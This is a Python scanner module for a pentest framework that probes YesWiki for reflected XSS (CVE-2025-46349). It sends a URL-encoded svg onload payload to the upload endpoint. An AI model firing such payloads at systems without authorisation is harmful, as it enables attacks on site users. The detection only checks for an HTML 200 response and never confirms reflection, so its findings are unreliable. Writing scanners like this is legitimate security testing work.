#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki is a wiki system written in PHP."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'YesWiki Reflected XSS via File Upload Detection',
        'description': 'YesWiki is a wiki system written in PHP. Prior to version 4.5.4, YesWiki is vulnerable to reflected XSS in the file upload form. This vulnerability allows any malicious unauthenticated user to create a link that can be clicked on by the victim to perform arbitrary actions. This issue has been patched in version 4.5.4.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'yeswiki'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-46349',
        ],
        'cve': 'CVE-2025-46349',
    }

    def run(self):
        path = '/?PagePrincipale/upload&file=%22%3E%3Csvg/onload=alert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/html',)
        if any(m in content_type for m in ctype_any):
            self.set_info(
                severity='high',
                reason='YesWiki Reflected XSS via File Upload detected',
                path=path,
            )
            return True
        return False

